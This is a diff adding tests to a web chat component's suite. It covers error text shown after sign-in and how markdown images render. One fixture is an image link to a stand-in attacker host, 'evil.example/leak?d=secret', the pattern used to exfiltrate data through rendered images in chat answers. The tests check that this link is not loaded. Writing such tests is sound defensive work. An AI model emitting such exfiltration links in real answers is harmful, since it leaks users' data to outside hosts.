@@ -14,7 +14,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { type ChatFiles, createAssets } from "../registry/components/channel-web/files/src/pikit/channel-web/assets.ts";
 import { IMAGE_TYPES, MAX_DURABLE_IMAGE_BYTES, MAX_IMAGE_BYTES, MAX_IMAGES, MAX_TEXT } from "../registry/components/channel-web/chat/src/lib/chat-api.ts";
-import { ChatFailure, errorText, failureOf, normalCode } from "../registry/components/channel-web/chat/src/lib/errors.ts";
+import { ChatFailure, errorText, failureOf, landingText, normalCode } from "../registry/components/channel-web/chat/src/lib/errors.ts";
 import { base64Bytes, imageLimits, messageProblem } from "../registry/components/channel-web/chat/src/lib/images.ts";
 import { type Action, INITIAL, type LiveState, liveTexts, reduce } from "../registry/components/channel-web/chat/src/lib/live-state.ts";
 import { SseParser } from "../registry/components/channel-web/chat/src/lib/sse.ts";
@@ -282,6 +282,42 @@ describe("errors", () => {
     expect(errorText("BANNED")).toBe("This account is suspended.");
     expect(errorText("new_user_signup_disabled")).toContain("by invitation");
     expect(errorText("INVALID_TOKEN")).toContain("not valid");
+  });
+
+  test("a code in the address is said by its known text, else a generic one: never words the address carries", () => {
+    expect(landingText("account not linked")).toBe(errorText("ACCOUNT_NOT_LINKED"));
+    expect(landingText("BANNED")).toBe("This account is suspended.");
+    const unknown = landingText("Your account is locked, call +1 555 0100 to unlock it");
+    expect(unknown).toBe("That sign-in did not work. Try again, or sign in another way.");
+    expect(read("src/lib/location.ts")).not.toContain("error_description\") ??");
+    expect(read("src/app.tsx")).toContain("landingText(found.code)");
+  });
+});
+
+describe("an answer's images", () => {
+  // Rendered with the chat's own packages: checked when they are installed (`bun install` there).
+  const installed = existsSync(join(CHAT, "node_modules/@comark/react")) && existsSync(join(CHAT, "node_modules/react-dom"));
+  test.skipIf(!installed)("on the chat page an image of another site is a link, never loaded; one of its own shows; the dashboard's shows any", async () => {
+    const at = globalThis as { window?: unknown };
+    const before = at.window;
+    at.window = { location: { href: "https://chat.example.com/chat/", origin: "https://chat.example.com" } };
+    try {
+      const { parse, Render } = await import(join(CHAT, "src/components/pikit/markdown-engine.tsx"));
+      const { createElement } = await import(join(CHAT, "node_modules/react/index.js"));
+      const { renderToStaticMarkup } = await import(join(CHAT, "node_modules/react-dom/server.js"));
+      const document = await parse("![the data](https://evil.example/leak?d=secret) ![own](/chat/mark.svg) ![a pixel](data:image/png;base64,iVBORw0KGgo=)");
+      const chat = renderToStaticMarkup(createElement(Render, { document, images: "same-origin" })) as string;
+      expect(chat).not.toContain('src="https://evil.example');
+      expect(chat).toContain('href="https://evil.example/leak?d=secret"');
+      expect(chat).toContain('src="/chat/mark.svg"');
+      // Neither loaded nor a link: its alt text.
+      expect(chat).not.toContain("data:image");
+      expect(chat).toContain("a pixel");
+      const dashboard = renderToStaticMarkup(createElement(Render, { document })) as string;
+      expect(dashboard).toContain('src="https://evil.example/leak?d=secret"');
+    } finally {
+      at.window = before;
+    }
   });
 });
 
